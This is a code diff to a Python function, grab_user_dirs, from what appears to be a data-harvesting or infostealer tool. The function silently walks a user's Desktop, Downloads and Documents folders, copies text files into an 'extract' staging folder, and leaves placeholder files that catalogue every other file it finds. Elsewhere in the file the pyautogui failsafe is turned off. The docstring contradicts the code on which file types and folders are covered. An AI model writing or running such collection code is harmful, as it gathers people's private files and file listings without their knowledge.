@@ -33,37 +33,47 @@ pyautogui.FAILSAFE = False
 
 def grab_user_dirs():
     """
-    Recursively copies every .txt/.csv under the user’s
-    Desktop, Downloads, Documents and Pictures into
-    EXTRACT_FOLDER/grabs, preserving the folder tree.
+    Copies all .txt and .csv files from
+    the user’s Desktop, Downloads, Documents and Pictures
+    into EXTRACT_FOLDER/grabs/<FolderName>. 
+    For any other file type, drops an empty
+    placeholder <original_filename>.txt so you get notified it existed.
     """
-    import os, shutil
-
     home = os.path.expanduser("~")
     target_root = os.path.join(EXTRACT_FOLDER, "grabs")
-    text_exts = {".txt", ".pdf"}
+    text_exts = {".txt"}
 
-    for folder in ("Desktop", "Downloads", "Documents", "Pictures"):
-        src_root = os.path.join(home, folder)
-        if not os.path.isdir(src_root):
+    for folder in ("Desktop", "Downloads", "Documents"):
+        src = os.path.join(home, folder)
+        dst = os.path.join(target_root, folder)
+        if not os.path.isdir(src):
             continue
+        os.makedirs(dst, exist_ok=True)
 
-        for root, dirs, files in os.walk(src_root):
-            # compute where to mirror this folder
-            rel_path = os.path.relpath(root, home)
-            dst_dir = os.path.join(target_root, rel_path)
-            os.makedirs(dst_dir, exist_ok=True)
+        for root, _, files in os.walk(src):
+            for f in files:
+                src_path = os.path.join(root, f)
+                if not os.path.isfile(src_path):
+                    continue
 
-            for fname in files:
-                _, ext = os.path.splitext(fname)
+                name, ext = os.path.splitext(f)
                 if ext.lower() in text_exts:
-                    src_file = os.path.join(root, fname)
-                    dst_file = os.path.join(dst_dir, fname)
+                    # copy real text/csv
                     try:
-                        shutil.copy2(src_file, dst_file)
+                        shutil.copy2(src_path, os.path.join(dst, f))
                     except Exception:
                         pass
-
+                else:
+                    # create an empty placeholder .txt
+                    placeholder = f"{f}.txt"
+                    placeholder_path = os.path.join(dst, placeholder)
+                    try:
+                        # if it doesn't exist already, touch it
+                        if not os.path.exists(placeholder_path):
+                            with open(placeholder_path, "w"):
+                                pass
+                    except Exception:
+                        pass
 
 
 
